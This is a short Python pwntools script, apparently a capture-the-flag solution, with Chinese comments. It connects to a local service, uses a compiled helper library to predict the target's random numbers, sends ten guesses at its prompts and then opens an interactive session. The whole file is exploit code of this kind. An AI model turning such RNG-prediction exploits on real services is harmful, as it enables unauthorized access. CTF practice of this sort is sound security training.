from pwn import *
import ctypes                              # 
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
# io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect("127.0.0.1",46175)          
# elf = ELF("./pwn")
# libc = ELF("./libc.so.6")

lib = ctypes.CDLL('./rand.so')
lib.randd.restype = ctypes.c_int
lib.init()

for i in range(10):
    ss = str(lib.randd()).encode()
    io.sendlineafter(b'>',ss)
io.interactive()
